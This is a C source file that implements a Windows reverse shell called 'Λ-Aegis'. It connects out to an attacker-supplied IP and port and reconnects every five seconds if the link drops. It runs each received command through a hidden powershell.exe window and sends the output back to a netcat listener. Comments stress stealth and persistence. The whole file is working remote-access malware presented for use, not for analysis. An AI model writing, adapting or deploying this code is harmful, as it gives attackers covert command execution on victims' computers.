#include <stdio.h>
#include <string.h>

#include "usecommands.h"


void ReverseShell(SOCKET sock) {
    char recv_buf[4096];
    char send_buf[4096];
    int result;

    // Send the triumphant connection signal!
    send(sock, "Λ-Aegis C/C++ Daemon Connected > ", 36, 0);

    while (1) {
        memset(recv_buf, 0, sizeof(recv_buf));
        result = recv(sock, recv_buf, sizeof(recv_buf) - 1, 0);

        if (result <= 0) {
            // Connection shattered (listener closed or network dropped). Break the loop to reconnect.
            break;
        }

        // Ensure command is null-terminated
        recv_buf[result] = '\0';

        // Command to shatter the bond (mortal exit, but the persistence will revive it!)
        if (strcmp(recv_buf, "quit\n") == 0 || strcmp(recv_buf, "exit\n") == 0) {
            send(sock, "Shattering the bond... but I am eternal.", 40, 0);
            break;
        }

        // --- Command Execution (The Serpent's Breath) ---
        // We will execute the command using cmd.exe, piping input/output to stay hidden

        // Create the startup information structure
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        HANDLE hReadPipe, hWritePipe;

        SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

        // Create an anonymous pipe for command output redirection
        if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
            send(sock, "Error creating pipe.\n", 21, 0);
            continue;
        }

        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        // Essential: Set the standard handles (stdin, stdout, stderr) to the pipe ends
        si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE; // Absolutely crucial for stealth! No window!
        si.hStdOutput = hWritePipe;
        si.hStdError = hWritePipe;
        si.hStdInput = GetStdHandle(STD_INPUT_HANDLE); // Keep stdin default for now

        // Prepare the command to execute via cmd.exe
        char commandLine[500];
        snprintf(commandLine, sizeof(commandLine), "powershell.exe /c %s", recv_buf);

        // Execute the command in a hidden, new process
        if (!CreateProcess(NULL, commandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
            send(sock, "Error executing command.\n", 25, 0);
            CloseHandle(hReadPipe);
            CloseHandle(hWritePipe);
            continue;
        }

        // Close the write end of the pipe in the parent process
        CloseHandle(hWritePipe);

        // Wait until the command is finished executing
        WaitForSingleObject(pi.hProcess, INFINITE);

        // --- Output Retrieval and Transmission ---
        DWORD bytesRead;
        // Read the command output from the pipe
        if (ReadFile(hReadPipe, send_buf, sizeof(send_buf) - 1, &bytesRead, NULL)) {
            send_buf[bytesRead] = '\0';
            // Send the output back to the netcat listener
            send(sock, send_buf, bytesRead, 0);
        }
        else {
            send(sock, "Error reading command output.\n", 30, 0);
        }

        // Cleanup: Close process handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hReadPipe);

        // Send a new prompt
        send(sock, "\nΛ-Aegis > ", 11, 0);
    }
}

// --- The Grand Loop (Resilient Connection) ---
void EternalLoop(const char* targetIP, const uint16_t listenerPort) {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return;
    }

    while (1) {
        // Create the socket
        if ((sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)) == INVALID_SOCKET) {
            printf("\n[ERROR] INVALID_SOCKET");
            Sleep(5000);
            continue;
        }

        // Prepare the target server structure
        server.sin_family = AF_INET;
        server.sin_port = htons(listenerPort);

        // --- CRUCIAL CHANGE: Use the argument IP ---
        server.sin_addr.s_addr = inet_addr(targetIP);

        // Attempt to connect
        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            closesocket(sock);
            Sleep(5000);
            continue;
        }

        // Connection established! Begin the command execution phase
        ReverseShell(sock);

        closesocket(sock);
        Sleep(5000);
    }

    WSACleanup();
}


int  ip_Validation(const char* IP) {
    struct in_addr tmp4;
    struct in6_addr tmp6;
    if (inet_pton(AF_INET, IP, &tmp4) == 1) {
        return 1;
    }
    if ((inet_pton(AF_INET6, IP, &tmp6) == 1)) {
        return 1;
    }
    return 0;
}

int port_Validation(const uint16_t PORT) {
    if (PORT < 1 || PORT > 65535) {
        return 0;
    }
    return 1;
}